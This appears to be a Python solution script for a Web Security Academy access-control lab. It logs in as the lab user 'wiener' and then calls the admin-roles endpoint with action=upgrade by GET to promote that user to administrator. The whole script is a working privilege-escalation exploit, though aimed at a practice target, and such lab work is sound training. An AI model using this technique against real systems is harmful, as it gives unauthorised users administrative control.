import requests

s = requests.Session()
site = '0a36000504c8d58d818d98b3008400ae.web-security-academy.net'

login_url = f'https://{site}/login'
login_data = { 'password' : 'peter', 'username' : 'wiener'}
resp = s.post(login_url, data=login_data)

upgrade_data = {
    'admin-roles' : 'upgrade',
    'user-name' : 'wiener'
}
url = f'https://{site}/admin-roles?username=wiener&action=upgrade'
resp = s.get(url)
print(resp.status_code)
print(resp.text)